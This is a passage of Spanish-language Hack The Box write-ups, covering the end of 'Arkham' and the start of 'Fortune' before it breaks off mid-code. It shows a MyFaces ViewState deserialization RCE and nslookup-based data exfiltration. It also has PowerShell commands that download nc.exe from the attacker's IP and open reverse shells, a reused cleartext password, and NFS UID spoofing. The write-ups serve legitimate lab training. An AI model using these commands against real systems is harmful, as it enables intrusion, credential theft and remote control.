appserver.zip A 4046695 Fri Feb 1 06:13:37 2019 5158399 blocks of size 4096. 2123866 blocks available smb: \\\u0026gt; mget * Get file appserver.zip? y getting file \\appserver.zip of size 4046695 as appserver.zip (265.1 KiloBytes/sec) (average 265.1 KiloBytes/sec) smb: \\\u0026gt;   1 2 3 4 5 6  root@sckull:~/htb/arkham# unzip appserver.zip Archive: appserver.zip inflating: IMPORTANT.txt inflating: backup.img root@sckull:~/htb/arkham# ls appserver.zip backup.img IMPORTANT.txt tmp   Encontramos un archivo llamado appserver.zip al descomprimir dicho archivo nos muestra dos archivos backup.img e IMPORTANT.txt.\nIMPORTANT.txt\n1  Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn\u0026#39;t have unauthenticated access to it. - Bruce   file backup.img\n1  backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e   BINWALK - backup.img\nUtilizamos binwalk para ver el contenido del archivo backup.img.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 LUKS_MAGIC version 0x1 aes sha256 519168 0x7EC00 Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995 544768 0x85000 Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995 551936 0x86C00 Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995 8388608 0x800000 Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=9c1e27b2-f91d-47d2-a167-49fd79957995 8542755 0x825A23 Zip archive data, at least v1.0 to extract, name: Mask/tomcat-stuff/ 8542831 0x825A6F Zip archive data, at least v2.0 to extract, compressed size: 1006, uncompressed size: 2208, name: Mask/tomcat-stuff/tomcat-users.xml 8543929 0x825EB9 Zip archive data, at least v2.0 to extract, compressed size: 1151, uncompressed size: 3498, name: Mask/tomcat-stuff/web.xml.bak 8545167 0x82638F Zip archive data, at least v2.0 to extract, compressed size: 709, uncompressed size: 1368, name: Mask/tomcat-stuff/context.xml 8545963 0x8266AB Zip archive data, at least v2.0 to extract, compressed size: 621, uncompressed size: 1172, name: Mask/tomcat-stuff/jaspic-providers.xml 8546680 0x826978 Zip archive data, at least v2.0 to extract, compressed size: 367, uncompressed size: 832, name: Mask/tomcat-stuff/faces-config.xml 8547139 0x826B43 Zip archive data, at least v2.0 to extract, compressed size: 2599, uncompressed size: 7678, name: Mask/tomcat-stuff/server.xml 8549824 0x8275C0 Zip archive data, at least v2.0 to extract, compressed size: 18347, uncompressed size: 174021, name: Mask/tomcat-stuff/web.xml 8568254 0x82BDBE Zip archive data, at least v1.0 to extract, compressed size: 39, uncompressed size: 39, name: Mask/tomcat-stuff/MANIFEST.MF 8568380 0x82BE3C Zip archive data, at least v2.0 to extract, compressed size: 7353, uncompressed size: 7586, name: Mask/robin.jpeg 8575806 0x82DB3E Zip archive data, at least v2.0 to extract, compressed size: 105045, uncompressed size: 105374, name: Mask/me.jpg 8680920 0x8475D8 Zip archive data, at least v2.0 to extract, compressed size: 687109, uncompressed size: 687160, name: Mask/mycar.jpg 9466405 0x907225 End of Zip archive, footer length: 22 [ .. ] 9638621 0x9312DD Copyright string: \u0026#34;copyright/ordfeminine/guillemotleft/logicalnot/hyphen/registered/macron/degree/plusminus/twosuperior/threesuperior/acute/mu/para\u0026#34; 9962496 0x980400 PDF document, version: \u0026#34;1.4\u0026#34; [ ... ] 9978880 0x984400 XML document, version: \u0026#34;1.0\u0026#34; 9979118 0x9844EE Copyright string: \u0026#34;copyright ownership.\u0026#34; 9981952 0x985000 XML document, version: \u0026#34;1.0\u0026#34; 9986048 0x986000 XML document, version: \u0026#34;1.0\u0026#34; 9986286 0x9860EE Copyright string: \u0026#34;copyright ownership.\u0026#34; 9988096 0x986800 XML document, version: \u0026#34;1.0\u0026#34; 9988334 0x9868EE Copyright string: \u0026#34;copyright ownership.\u0026#34; 9990144 0x987000 XML document, version: \u0026#34;1.0\u0026#34; 9991168 0x987400 XML document, version: \u0026#34;1.0\u0026#34; 9991406 0x9874EE Copyright string: \u0026#34;copyright ownership.\u0026#34; 9999360 0x989400 XML document, version: \u0026#34;1.0\u0026#34; 9999598 0x9894EE Copyright string: \u0026#34;copyright ownership.\u0026#34; 10016768 0x98D800 JPEG image data, JFIF standard 1.01 10024960 0x98F800 JPEG image data, JFIF standard 1.01 10041344 0x993800 JPEG image data, EXIF standard 10041356 0x99380C TIFF image data, little-endian offset of first image directory: 8 10057728 0x997800 JPEG image data, JFIF standard 1.01   Dentro del archivo encontramos varios documentos que se refieren a archivos tomcat, imagenes, y archivos xml, descomprimimos los archivos con binwalk.\n1  binwalk -e backup.img   Encontramos varios archivos y carpetas, dentro de la carpeta Mask encontramos imagenes y una subcarpeta tomcat-stuff, utilizamos binwalk con las imagenes para verificar que no tengan archivos ocultos dentro.\nNinguna de las imagenes contiene archivos que puedan servirnos, dentro de la carpeta tomcat-stuff encontramos archivos de configuracion.\nDentro de los archivos de configuracion encontramos un backup de uno de ellos web.xml.bak, en su interior vemos la configuracion que tiene la pagina, algunos parametros de la configuracion contienen datos que sirven para encriptar los datos que se reciben y se envian por medio de la pagina web y podemos notar que esta corriendo en apache myfaces.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;Faces Servlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.faces\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;description\u0026gt;State saving method: \u0026#39;client\u0026#39; or \u0026#39;server\u0026#39; (=default). See JSF Specification 2.5.2\u0026lt;/description\u0026gt; \u0026lt;param-name\u0026gt;javax.faces.STATE_SAVING_METHOD\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;server\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.SECRET\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_ALGORITHM\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;HmacSHA1\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_SECRE\u0026lt;T/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt;   HTTP - 8080 Puerto 8080 en http.\nGOBUSTER Considerando que la pagina esta corrriendo en un apache myfaces (web.xml.bak), vamos a utilizar gobuster para buscar directorios y documentos.\nEncontramos directorios y documentos pertenecientes a la pagina, al visitar cada una de las opciones de la pagina nos encontramos una para una subscripcion de correo electronico /userSubscribe.faces la cual no aparecio con gobuster.\n/userSubscribe.faces Al registrar un correo nos redirige a otra pagina /thankyou.faces con un mensaje de registro.\nViewState - Arkham Al revisar el codigo fuente de userSubscribe.faces encontramos algunos valores pertenecen a javax.faces.ViewState.\nViewState JSF utiliza viewStates para almacenar los datos de la vista, pueden ser \u0026lsquo;almacenados\u0026rsquo; en el servidor o el cliente, dichos valores de viewstate estan dentro del html de una pagina como un campo oculto con el nombre de javax.faces.ViewState, como es el caso de la pagina que encontramos.\nJava Deserialization Deserializacion y Serializacion es el proceso por el cual se convierte un objeto a bytes y viceversa, para leerlo e interpretarlo por el servidor. Al investigar acerca de dichos valores encontramos que, existe una vulnerabilidad de deserializacion en java, dichos valores del viewstate estan codificados en base64 en algunos casos no estan encriptados por lo que puede ser leido el contenido.\nAl intentar decodificar en base64 nos muestran algunos caracteres, por lo que podemos afirmar que el objeto esta encoriptado.\nJSF ViewState RCE INFO: JSF ViewStates RCE - Vulnerability\nEncontramos un post el cual habla de una vulnerabilidad RCE de ViewState en las implementaciones de JSF como Oracle Mojarra (JSF reference implementation), Apache MyFaces. Existen dos \u0026lsquo;tipos\u0026rsquo; de ViewState, el que se almacena en el servidor y el cliente, ambos son objetos serializados, para que dicha vulnerabilidad sea aprovechada para la ejecucion de comandos deben de cumplirse algunas condiciones, el viewstate no debe de estar encriptado, en el caso de Mojarra el viewstate debe de estar configurado en el cliente, en MyFaces puede estar configurado en el cliente o servidor.\nEn el caso de MyFaces encriptar el ViewState esta por defecto activado, puede ser desactivado para hacer tests configurando el parametro de org.apache.myfaces.USE_ENCRYPTION = false y tambien puede utilizar una contraseña para la encriptacion. Tambien nos dice que por defecto Myfaces utiliza DES como algoritmo de encriptacion y HMAC-SHA1 para autenticar el ViewState. Por defecto el almacenamiento del ViewState esta configurado por el lado del servidor javax.faces.STATE_SAVING_METHOD = server.\nINFO: Secure Your Application\nAlgunos post sobre JAVA Deseralization:\nJava Serialization\nJava Serialization with burp and ysoserial\nDeserialization Vulnerability - $1500\nAhora que sabemos todo esto, podemos volver a nuestro archivo web.xml.bak el cual contiene algunos parametros que pueden ser de utilidad para aprovechar el RCE del ViewState y ejecutar comandos dentro de la maquina.\n1 2  \u0026lt;param-name\u0026gt;javax.faces.STATE_SAVING_METHOD\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;server\u0026lt;/param-value\u0026gt;   Tambien tiene una contraseña que es utilizada para encriptar el viewstate.\n1 2  \u0026lt;param-name\u0026gt;org.apache.myfaces.SECRET\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt;   El algoritmo de autenticacion.\n1 2  \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_ALGORITHM\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;HmacSHA1\u0026lt;/param-value\u0026gt;   Mensaje de autenticacion para el algoritmo.\n1 2  \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_SECRET\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt;   StateUtils.java Existen algunas herramientas para explotacion de deserializacion en java como jexboss y ysoserial, tambien existe una version modificada de ysoserial-modified. Al intentar utilizar estas herramientas contra la maquina no funcionan, por el tipo de encriptacion en la configuracion del archivo (web.xml.bak), estas herramientas aprovechan el viewstatate cuando no estan encriptadas.\nPara arkham vamos a utilizar ysoserial-modified para generar un payload y encriptarlo por medio de la clase de apache myfaces, StateUtils.java, esta clase StateUtils.java contiene metodos que pueden construir y reconstruir un valor de viewstate.\nConfiguracion de los campos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  private static final Logger log = Logger.getLogger(StateUtils.class.getName()); //Cambio por HmacSHA1 public static final String macAlgorithm = \u0026#34;HmacSHA1\u0026#34;; //Cambio por MAC_SECRET -\u0026gt; SnNGOTg3Ni0= //public static final String INIT_MAC_SECRET = \u0026#34;MAC_SECRET\u0026#34;; //public static final String INIT_MAC_SECRET_KEY_CACHE = \u0026#34;org.apache.myfaces.MAC_SECRET.CACHE\u0026#34;; //configuracion Local encrypt/decrypt private static final String encodedKey =\u0026#34;SnNGOTg3Ni0=\u0026#34;; private static final byte[] decodedKey = decode(encodedKey.getBytes()); private static final SecretKey secretKey = new SecretKeySpec(decodedKey,\u0026#34;DES\u0026#34;); //configuracion Local encrypt/decrypt private static final String macSecretStr = \u0026#34;SnNGOTg3Ni0=\u0026#34;; private static final byte[] macSecretBytes = decode(macSecretStr.getBytes()); private static final SecretKey macSecretKey = new SecretKeySpec(macSecretBytes, macAlgorithm); private static final String ZIP_CHARSET = \u0026#34;ISO-8859-1\u0026#34;; // String DEFAULT_ALGORITHM = \u0026#34;DES\u0026#34;; private static final String algorithm = \u0026#34;DES\u0026#34;; // String DEFAULT_ALGORITHM_PARAMS = \u0026#34;ECB/PKCS5Padding\u0026#34;; private static final String algorithmParams = \u0026#34;ECB/PKCS5Padding\u0026#34;; private static final byte[] iv = null;   Metodos, se eliminan todos los valores ExternalContext, ServletContext:\n1 2 3 4 5 6 7 8  construct(Object object) reconstruct(String string) encrypt(byte[] insecure) encode(byte[] bytes) decrypt(byte[] secure) decode(byte[] bytes) getAsObject(byte[] bytes) getAsByteArray(Object object)   Creamos un metodo para enviar nuestro payload:\n1  sendPayload(String viewstatePayload)   Para la ejecucion de comandos utilizamos ysoserial-modified.jar para generar un payload:\n1  CommonsCollections1, CommonsCollections2, CommonsCollections3, CommonsCollections4, CommonsCollections5, CommonsCollections6   Funciona tambien con la version ysoserial.jar, pero se tienen comandos \u0026lsquo;limitados\u0026rsquo;, la version modificada es una mejor version que nos permite ejecutar comandos cmd/powershell/sh.\nYa que desconocemos del payload que funciona, utilizamos los descritos anteriormente, vamos a hacer un request DNS a nuestra maquina con cada payload (ej: nslookup CommonsCollections1 10.10.1X.1X) y el payload que funcione nos aparecerá en nuestra terminal (Utilizamos responder).\nAqui se encuentra el codigo:\nCodigo Java - GitHub De igual forma realice un script en python para el mismo fin, utilizando la libreria pydes.\nCodigo Python - GitHub RCE - Request DNS Obtenemos un request DNS y vemos que los payloads que funcionan en arkham son CommonsCollections5, CommonsCollections6, por lo que podemos utilizar cualquiera de ellos para ejecutar comandos en la maquina.\nDe igual forma utilizando nslookup podemos saber que usuario somos y que usuarios existen en la maquina, utilizando los siguientes comandos.\nwhoami\n1  //10.10.13.129 \u0026amp; for /f %i in (\u0026#39;whoami\u0026#39;) do nslookup %i 10.10.13.129   dir C:\\Users\n1  //10.10.13.129 \u0026amp; for /f \u0026#34;tokens=1,2,3\u0026#34; %a in (\u0026#39;dir /B \u0026#34;C:\\Users\u0026#34;\u0026#39;) do nslookup %a.%b.%c 10.10.13.129   REVERSE SHELL - Alfred Para obtener una shell inversa vamos a utilizar powershell para descargar netcat (nc.exe) y ejecutar una shell inversa.\nComando: Cambiamos el primer parametro de cmand a \u0026ldquo;powershell\u0026rdquo;.\n1  wget http://10.10.13.129/nc.exe -o C:\\Users\\Public\\nc.exe; C:\\Users\\Public\\nc.exe -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 10.10.13.129 443   Obtenemos una shell inversa como Alfred y nuestra bandera User.txt.\nUSUARIOS - Arkham Podemos ver que existen otros dos usuarios Batman y Administrator.\nVemos que Batman pertenece al grupo de Administrators.\nUSER - BATMAN En el directorio C:\\Users\\alfred\\Downloads\\backups encontramos un archivo backup.zip, lo trasladamos a nuestra maquina con netcat.\nAl descomprimirlo nos muestra un archivo .ost de Microsoft Outlook, utilizamos readpst para leer el archivo de correos el cual nos extrajo los borradores (Drafts.mbox).\nPara lectura de Drafts.mbox utilizamos mutt.\n1  mutt -Rf Drafts.mbox   Encontramos una imagen de cmd con un comando que contiene un usuario y contraseña:\n1  net use G: \\\\10.10.10.10\\gotham /user:batman Zx^#QZX+T!123   Utilizamos powershell para cambiar al usuario(sesion) Batman con el siguiente comando:\n1  $username =\u0026#34;ARKHAM\\batman\u0026#34;;$password = convertto-securestring -AsPlainText -Force -String \u0026#34;Zx^#QZX+T!123\u0026#34;; $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password; New-PSSession -Credential $cred | Enter-PSSession   Exitosamente pudimos cambiar al usuario Batman pero no podemos listar los directorios y archivos.\nREVERSE SHELL - BATMAN Para obtener una shell inversa con el usuario Batman vamos a utilizar Invoke-Command para descargar netcat (nc.exe) en el directorio de Batman y ejecutar una shell inversa, el siguiente comando se ejecuta con el usuario alfred.\n1  $username = \u0026#39;ARKHAM\\batman\u0026#39;;$password = \u0026#39;Zx^#QZX+T!123\u0026#39;;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName ARKHAM -Command {powershell wget http://10.10.15.2:8081/nc.exe -o C:\\Users\\Batman\\Documents\\nc.exe; powershell C:\\Users\\Batman\\Documents\\nc.exe -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 10.10.15.2 445}   Obtenemos una shell y podemos ejecutar comandos, pero no podemos acceder a la carpeta de Administrator.\nPor alguna razon el siguiente comando funciona para acceder a la carpeta de Administrator, y obtenemos nuestra bandera root.txt.\n1  cd \\\\10.10.10.130\\C$\\Users\\Administrator\\   ","description":"","id":81,"section":"posts","tags":["windows","deserialization","readpst"],"title":"Hack The Box - Arkham","uri":"https://sckull.github.io/posts/arkham/"},{"content":"Fortune es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Fortune     OS Otro   Puntos 50   Dificultad Dificil   IP 10.10.10.127   Maker AuxSarge    NMAP Al realizar un escaneo con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # Nmap 7.70 scan initiated Wed Mar 13 22:48:02 2019 as: nmap -sV -sC -A -o nmap.scan 10.10.10.127 Nmap scan report for 10.10.10.127 Host is up (0.17s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) | ssh-hostkey: | 2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA) | 256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA) |_ 256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519) 80/tcp open http OpenBSD httpd |_http-server-header: OpenBSD httpd |_http-title: Fortune 443/tcp open ssl/https? |_ssl-date: TLS randomness does not represent time No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.70%E=4%D=3/13%OT=22%CT=1%CU=40048%PV=Y%DS=2%DC=T%G=Y%TM=5C89893 OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=RD%CI=RI%TS=22)OPS(O OS:1=M54DNNSNW6NNT11%O2=M54DNNSNW6NNT11%O3=M54DNW6NNT11%O4=M54DNNSNW6NNT11% OS:O5=M54DNNSNW6NNT11%O6=M54DNNSNNT11)WIN(W1=4000%W2=4000%W3=4000%W4=4000%W OS:5=4000%W6=4000)ECN(R=Y%DF=Y%T=40%W=4000%O=M54DNNSNW6%CC=N%Q=)T1(R=Y%DF=Y OS:%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=S%F OS:=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=A%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y OS:%T=40%W=0%S=A%A=S%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=FF%IPL=38%UN=0%RI OS:PL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)   HTTPS Al visitar la pagina nos encontramos con lo siguiente, por lo que no podemos hacer nada por ahora.\nHTTP Con gobuster encontramos la siguiente ruta.\n1  /fortune (Status: 301)   Utilizamos firefox para ver las peticiones que hace cuando enviamos una solicitud a una de las opciones, en cada opcion si se hace una peticion este nos devuelve de manera aleatoria un mensaje.\nY encontramos que, al editar las peticiones (POST db=fortunes), encontramos que podemos ejecutar comandos (RCE):\nAl realizar una enumeracion de carpeta y archivos encontramos en la carpeta del usuario bob (/home/bob/) certificados que pueden pertenecen a la pagina web https.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  /home/bob ├── ca │ ├── certs │ │ └── ca.cert.pem │ ├── crl │ ├── index.txt │ ├── index.txt.attr │ ├── index.txt.old │ ├── intermediate │ │ ├── certs │ │ │ ├── ca-chain.cert.pem │ │ │ ├── fortune.htb.cert.pem │ │ │ └── intermediate.cert.pem │ │ ├── crl │ │ ├── crlnumber │ │ ├── csr │ │ │ ├── fortune.htb.csr.pem │ │ │ └── intermediate.csr.pem │ │ ├── index.txt │ │ ├── index.txt.attr │ │ ├── newcerts │ │ │ └── 1000.pem │ │ ├── openssl.cnf │ │ ├── private │ │ │ ├── fortune.htb.key.pem │ │ │ └── intermediate.key.pem │ │ ├── serial │ │ └── serial.old │ ├── newcerts │ │ └── 1000.pem │ ├── openssl.cnf │ ├── private [error opening dir] │ ├── serial │ └── serial.old └── dba └── authpf.sql   La razon por la cual no podamos acceder a la pagina https es porque no tenemos el certificado de la misma, esta es una grafica de como funciona un certificado.\ncertsuperior - Certificados\nOracle - certificados\nPara poder acceder a la pagina debemos de crear nuestro archivo pkc12 el cual contiene el certificado y la clave, copiamos a nuestra maquina local los archivos intermediate.cert.pem e intermediate.key.pem, utilizando openssl generamos el certificado con el siguiente comando:\nssl - Certificate File\nibm - Certificate\n1  openssl pkcs12 -export -out cert.p12 -in intermediate.cert.pem -inkey intermediate.key.pem -passin pass:root -passout pass:root   Obtenemos el certificado y lo importamos a nuestro navegador en las configuraciones de certificado.\nVisitamos la pagina en https y nos muestra lo siguiente:\nAl visitar la pagina /generate nos muestra una clave publica agregada al los archivos de autorizacion ssh de la maquina y una clave privada con la cual nos podemos conectar al mismo.\nNos conectamos al servicio ssh con la clave generada y el usuario nfsuser, nos muestra el siguiente mensaje, pero nuestra shell no es interactiva:\nAl revisar los procesos que corren en la maquina nos muestra un servicio de authpf:\nSegun la documentacion de openbsd sobre Authpf nos dice que \u0026ldquo;es un intérprete (shell) para pasarelas de autenticación. Una pasarela de autenticación es como una pasarela de red normal (también llamada enrutador), con la diferencia que \u0026ldquo;los usuarios se deben autenticar ante la pasarela\u0026rdquo; antes de que se permita que pase el tráfico a través de ésta\u0026rdquo;.\nopenbsd - authpf\nautphf - español\nLas reglas de authpf /etc/authpf/authpf.rules nos muestran que cualquier usuario ip ($user_ip) en este caso nfsuser le de paso o permiso en los protocolos tcp udp.\n1 2  ext_if = \u0026#34;em0\u0026#34; pass in quick on $ext_if inet proto { tcp udp } from $user_ip to ($ext_if) keep state   Sabiendo que tenemos acceso a los protocolos tcp y udp volvemos a hacer un escaneo de puertos y encontramos los siguientes puertos abiertos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-21 04:58 GMT Nmap scan report for 10.10.10.127 Host is up (0.18s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) 80/tcp open http OpenBSD httpd 111/tcp open rpcbind 2 (RPC #100000) 443/tcp open ssl/https? 2049/tcp open nfs 2-3 (RPC #100003) 8081/tcp open http OpenBSD httpd Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.31 seconds   Encontramos que hay un servicio rpcbind y nfs que estan corriendo en la maquina, escaneamos el servicio rpcbind:\nRPCBIND Encontramos que el servicio NFS esta corriendo tanto en tcp y udp, por lo que podemos montar los share name de la maquina localmente.\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@sckull:~/htb/fortune# rpcinfo -p 10.10.10.127 program vers proto port service 100000 2 tcp 111 portmapper 100000 2 udp 111 portmapper 100005 1 udp 694 mountd 100005 3 udp 694 mountd 100005 1 tcp 944 mountd 100005 3 tcp 944 mountd 100003 2 udp 2049 nfs 100003 3 udp 2049 nfs 100003 2 tcp 2049 nfs 100003 3 tcp 2049 nfs root@sckull:~/htb/fortune#   NFS Al revisar los puntos compartidos obtenemos que /home puede ser montado\n1 2 3 4  root@sckull:~/htb/fortune# showmount -e 10.10.10.127 Export list for 10.10.10.127: /home (everyone) root@sckull:~/htb/fortune#   ACCESO a /home Para acceder a la carpeta /home debemos montarlo localmente y asi poder acceder a las carpetas y archivos que se encuentran dentro.\n1 2 3 4  root@sckull:~/htb/fortune# mkdir tmp_nfs root@sckull:~/htb/fortune# mount -t nfs 10.10.10.127:/home /root/htb/fortune/tmp_nfs root@sckull:~/htb/fortune# ls tmp_nfs/ bob charlie nfsuser   Observamos que hay tres usuarios de los cuales bob ya conocemos su interior, mas no el de charlie y nfsuser:\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@sckull:~/htb/fortune# ls -lah tmp_nfs/nfsuser/ total 16K drwxr-xr-x 2 1002 1002 512 Nov 3 02:39 . drwxr-xr-x 5 root root 512 Nov 3 01:19 .. -rw-r--r-- 1 1002 1002 771 Oct 11 20:18 .cshrc -rw-r--r-- 1 1002 1002 101 Oct 11 20:18 .cvsrc -rw-r--r-- 1 1002 1002 359 Oct 11 20:18 .login -rw-r--r-- 1 1002 1002 175 Oct 11 20:18 .mailrc -rw-r--r-- 1 1002 1002 215 Oct 11 20:18 .profile -rw-r--r-- 1 1002 1002 87 Oct 11 20:18 .Xdefaults root@sckull:~/htb/fortune# ls -lah tmp_nfs/charlie/ ls: cannot open directory \u0026#39;tmp_nfs/charlie/\u0026#39;: Permission denied root@sckull:~/htb/fortune#   Podemos ver que a la carpeta del usuario charlie no tenemos acceso, para ello vamos a crear un usuario localmente y un grupo para poder acceder al interior, utilizamos stat para ver informacion de la carpeta, con lo cual vemos que /home/charlie tiene propiedades uid: 1000 y gid:1000.\n1 2 3 4 5 6 7 8 9  root@sckull:~/htb/fortune# stat tmp_nfs/charlie/ File: tmp_nfs/charlie/ Size: 512 Blocks: 4 IO Block: 32768 directory Device: 31h/49d\tInode: 27648 Links: 3 Access: (0750/drwxr-x---) Uid: ( 1000/ UNKNOWN) Gid: ( 1000/ UNKNOWN) Access: 2019-03-21 05:17:35.827314870 +0000 Modify: 2019-03-21 05:33:05.655948328 +0000 Change: 2019-03-21 05:33:05.655948328 +0000 Birth: -   Creamos un usuario y grupo local para charlie:\n1 2 3  root@kali:~# groupadd --gid 1000 charlie_group root@kali:~# useradd --uid 1000 --groups charlie_group charlie_user root@kali:~# sudo -u charlie_user ls -l tmp_nfs/charlie   Con ello logramos acceder y obtener tambien nuestra bandera user.txt.\nAhora que tenemos acceso a la carpeta de charlie podemos agregar nuestra clave ssh a authorized_keys para poder logearnos con el servicio ssh como charlie.\nDe la misma forma para el usuario bob:\nESCALACION DE PRIVILEGIOS Dentro de la carpeta charlie nos encontramos con un archivo mbox, que contiene un mensaje de bob para charlie.\nNos dice que bob cambio la contraseña para el usuario dba es la misma que la del usuario root, haciendo una enumeracion de carpetas y archivos nos encontramos un archivo pgadmin4.db que contiene tablas que le pertenecen a pgadmin3.4, utilizando sqlite db browser, dentro de este archivo encontramos una contraseña y usuario dba especificamente en la tabla de server, tambien una tabla que contiene usuario y contraseña de bob y charlie.\nRuta del archivo:\n1  /var/appsrv/pgadmin4/pgadmin4.db   Tambien encontramos la ruta donde se encuentran los documentos de pgadmin dentro del archivo pgadmin4.ini:\ndba\nbob y charlie\nUsuario ROOT En la ruta de pgadmin4 local (/usr/local/pgadmin4/pgadmin4-3.4/web/utils/), encontramos un archivo llamado crypto.py, en su interior encontramos funciones las cuales encriptan y desencriptan contraseñas (encrypt(), decrypt(), pad(), pqencryptpassword()), la funcion de encrypt() necesita un texto y una clave, la funcion decrypt() el texto encriptado (ciphertext) anteriormente con la funcion encrypt() y la clave, con estas dos funciones y la contraseña que se encuentra en la tabla de server del usuario dba, podemos intentar desencriptarla solo nos falta la clave (key).\nDentro de la base de datos (pgadmin4.db) encontramos algunas claves (tabla -\u0026gt; keys) que podriamos utilizar para la funcion decrypt(), de igual forma los usuarios (tabla -\u0026gt; users) y contraseñas (tabla -\u0026gt; users).\nLocalmente agregamos el siguiente codigo a nuestro archivo crypto.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  if __name__ == \u0026#39;__main__\u0026#39;: list_keys = [\u0026#39;root\u0026#39;,\u0026#39;operator\u0026#39;,\u0026#39;www\u0026#39;,\u0026#39;postgresql\u0026#39;,\u0026#39;pgadmin4\u0026#39;,\u0026#39;fortune\u0026#39;,\u0026#39;charlie\u0026#39;, \u0026#39;bob\u0026#39;,\u0026#39;nfsuser\u0026#39;,\u0026#39;authpf\u0026#39;,\u0026#39;admin\u0026#39;,\u0026#39;administrator\u0026#39;,\u0026#39;pgadmin3\u0026#39;,\u0026#39;Administrator\u0026#39;,\u0026#39;bob@fortune.htb\u0026#39;, \u0026#39;charlie@fortune.htb\u0026#39;,\u0026#39;user\u0026#39;,\u0026#39;saQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs=\u0026#39;, \u0026#39;R_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM=\u0026#39;,\u0026#39;qIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q=\u0026#39;, \u0026#39;dba\u0026#39;,\u0026#39;postgres\u0026#39;,\u0026#39;$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ\u0026#39;, 